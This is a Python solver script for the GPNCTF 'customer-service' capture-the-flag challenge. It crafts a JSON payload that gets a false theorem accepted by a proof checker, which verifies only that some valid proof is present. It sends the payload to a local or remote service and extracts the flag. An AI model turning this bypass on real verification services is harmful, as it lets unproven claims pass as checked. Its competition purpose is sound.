#!/usr/bin/env python3
import argparse
import json
import re
import socket
import ssl
import subprocess
import sys
from pathlib import Path

FLAG_RE = re.compile(rb'GPNCTF\{[^}\r\n]+\}')


def build_payload() -> tuple[str, str]:
    """
    Exploit payload for customer-service.

    The checker validates `proof` independently and never checks that the proof's
    final theorem matches the theorem statement. After ProofOK, it extends the
    statement itself as a theorem with no proof; checked_extend reports exactly
    one axiom, which the challenge mistakenly allows for ty == 'thm'.
    """
    payload = {
        "imports": [],
        "content": [
            {
                "ty": "thm",
                "name": "pwn",
                "vars": {"false": "bool", "x": "bool"},
                "prop": "false",
                "proof": [
                    # Any closed, gap-free valid proof is enough. This proves x = x.
                    {"id": "0", "rule": "reflexive", "args": "x", "prevs": [], "th": ""}
                ],
            }
        ],
    }
    raw = json.dumps(payload, separators=(",", ":"))
    return raw, raw.encode().hex()


def extract_flag(data: bytes) -> str | None:
    m = FLAG_RE.search(data)
    return m.group(0).decode() if m else None


def run_local(chal_dir: str, command: str) -> tuple[bytes, int]:
    _, hx = build_payload()
    p = subprocess.Popen(
        command,
        cwd=chal_dir,
        shell=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = p.communicate((hx + "\n").encode(), timeout=60)
    return out, p.returncode


def recv_some(sock: socket.socket, timeout: float = 2.0) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            b = sock.recv(4096)
            if not b:
                break
            chunks.append(b)
            if b"GPNCTF{" in b or b"flag" in b.lower():
                # continue a little to include full line
                sock.settimeout(0.3)
        except socket.timeout:
            break
    return b"".join(chunks)


def run_remote(host: str, port: int, use_ssl: bool) -> bytes:
    _, hx = build_payload()
    raw_sock = socket.create_connection((host, port), timeout=10)
    if use_ssl:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(raw_sock, server_hostname=host)
    else:
        s = raw_sock
    try:
        banner = recv_some(s, timeout=1.5)
        s.sendall((hx + "\n").encode())
        out = banner + recv_some(s, timeout=3.0)
        return out
    finally:
        s.close()


def main() -> int:
    ap = argparse.ArgumentParser(description="Solver for GPNCTF customer-service")
    sub = ap.add_subparsers(dest="mode", required=True)

    p_payload = sub.add_parser("payload", help="print JSON and hex payload")

    p_local = sub.add_parser("local", help="run local checker with uv")
    p_local.add_argument("--dir", default=".", help="challenge directory containing checker.py and flag.txt")
    p_local.add_argument("--cmd", default="uv run checker.py", help="command to start checker")

    p_remote = sub.add_parser("remote", help="send payload to remote service")
    p_remote.add_argument("host")
    p_remote.add_argument("port", type=int)
    p_remote.add_argument("--ssl", action="store_true")

    args = ap.parse_args()
    raw, hx = build_payload()

    if args.mode == "payload":
        print("[+] JSON payload:")
        print(raw)
        print("[+] hex payload:")
        print(hx)
        return 0

    if args.mode == "local":
        out, rc = run_local(args.dir, args.cmd)
        sys.stdout.buffer.write(out)
        flag = extract_flag(out)
        print(f"\n[+] process exit code: {rc}")
        if flag:
            print(f"[+] extracted flag: {flag}")
            return 0
        print("[-] no flag extracted")
        return 1

    if args.mode == "remote":
        out = run_remote(args.host, args.port, args.ssl)
        sys.stdout.buffer.write(out)
        flag = extract_flag(out)
        if flag:
            print(f"\n[+] extracted flag: {flag}")
            return 0
        print("\n[-] no flag extracted")
        return 1

    return 2


if __name__ == "__main__":
    raise SystemExit(main())
